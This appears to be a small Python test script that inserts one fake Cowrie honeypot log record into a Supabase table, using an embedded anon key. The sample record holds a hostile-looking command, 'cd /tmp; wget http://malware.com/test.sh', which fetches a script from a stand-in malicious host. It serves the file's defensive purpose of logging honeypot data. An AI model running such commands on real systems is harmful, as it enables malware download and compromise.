import json
from supabase import create_client

# 1. Supabase 프로젝트 정보
SUPABASE_URL = "https://bdgjxqagttkkpswhwnzv.supabase.co"

# ⚠️ 아래 큰따옴표 안쪽에 본인의 Supabase anon public key를 붙여넣으세요!
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJkZ2p4cWFndHRra3Bzd2h3bnp2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODk1ODYxOTEsImV4cCI6MjEwNTE2MjE5MX0.f2MrYnsr_rcn6AWHNJjz6heAvFnWOMLOdL-yDZdoP7M"

supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

# 2. DB에 테스트로 넣어볼 가짜 데이터 1건
test_data = {
    "session_id": "test_session_001",
    "timestamp": "2026-09-17T10:30:00Z",
    "src_ip": "185.220.101.5",
    "event_id": "cowrie.login.success",
    "username": "root",
    "password": "password123",
    "input_command": "cd /tmp; wget http://malware.com/test.sh"
}

# 3. DB로 전송
try:
    response = supabase.table("honeypot_logs").insert(test_data).execute()
    print("[SUCCESS] 성공적으로 DB에 저장되었습니다!")
    print("결과:", response)
except Exception as e:
    print("[ERROR] 에러 발생:", e)